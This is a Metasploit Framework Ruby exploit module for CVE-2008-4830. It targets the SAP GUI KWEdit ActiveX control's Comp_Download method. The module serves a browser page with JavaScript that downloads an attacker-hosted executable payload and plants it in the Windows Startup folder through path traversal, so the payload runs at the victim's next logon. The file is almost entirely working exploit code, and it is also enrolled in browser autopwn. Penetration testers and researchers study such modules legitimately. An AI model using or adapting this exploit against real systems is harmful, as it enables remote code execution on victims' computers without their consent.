##
# $Id: enjoysapgui_comp_download.rb 11189 2010-12-01 03:18:05Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:javascript => true,
		:rank       => NormalRanking,
		:vuln_test  => nil,
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EnjoySAP SAP GUI ActiveX Control Arbitrary File Download',
			'Description'    => %q{
					This module allows remote attackers to place arbitrary files on a users file system
				by abusing the "Comp_Download" method in the SAP KWEdit ActiveX Control (kwedit.dll 6400.1.1.41).
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 11189 $',
			'References'     =>
				[
					[ 'CVE', '2008-4830'],
					[ 'OSVDB', '53680'],
					[ 'URL', 'http://dsecrg.com/files/pub/pdf/HITB%20-%20Attacking%20SAP%20Users%20with%20Sapsploit.pdf' ],
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => '??? ?? ????'))

		register_options(
			[
				OptString.new('PATH', [ true, 'The path to place the executable.', '/../../../../../../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']),
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		payload_url =  "http://"
		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"

		if (request.uri.match(/payload/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		vname  = rand_text_alpha(rand(100) + 1)
		exe    = rand_text_alpha(rand(20) + 1)

		content = %Q|
<html>
<head>
	<script>
		try {
		var #{vname} = new ActiveXObject('Kweditcontrol.KWedit.1');
		#{vname}.Comp_Download("#{payload_url}","#{datastore['PATH']}/#{exe}.exe");
		} catch( e ) { window.location = 'about:blank' ; }
	</script>
</head>
</html>
				|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

end
